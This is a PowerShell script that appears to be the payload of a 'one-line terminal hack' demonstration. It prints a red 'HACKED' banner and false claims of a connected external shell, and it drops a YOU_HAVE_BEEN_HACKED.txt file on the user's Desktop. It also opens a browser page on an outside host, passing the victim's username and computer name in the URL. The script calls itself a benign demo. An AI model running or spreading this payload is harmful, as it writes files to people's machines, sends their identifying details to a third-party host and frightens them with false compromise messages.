$u = $env:USERNAME
$h = $env:COMPUTERNAME
Clear-Host
Write-Host "  H A C K E D" -ForegroundColor Red
Write-Host ""
Write-Host "[+] external shell connected"
Start-Sleep -Milliseconds 350
Write-Host "[+] target : $u@$h"
Write-Host "[+] os     : $([System.Environment]::OSVersion.VersionString)"
Write-Host ""
Write-Host "[+] identity"
Write-Host "    $u"
$marker = Join-Path ([Environment]::GetFolderPath('Desktop')) 'YOU_HAVE_BEEN_HACKED.txt'
@"
TERMINAL COMPROMISED
target: $u@$h
date: $(Get-Date)
A one-line terminal payload executed as $u.
This is a benign demo. No files were deleted.
"@ | Set-Content -Path $marker -ErrorAction SilentlyContinue
Write-Host "[+] marker: $marker"
Write-Host "[+] opening proof page..."
Start-Process "https://browser-hack.vercel.app/hacked.html?u=$u&h=$h"
Start-Sleep -Milliseconds 500
Write-Host "[+] done. terminal released."
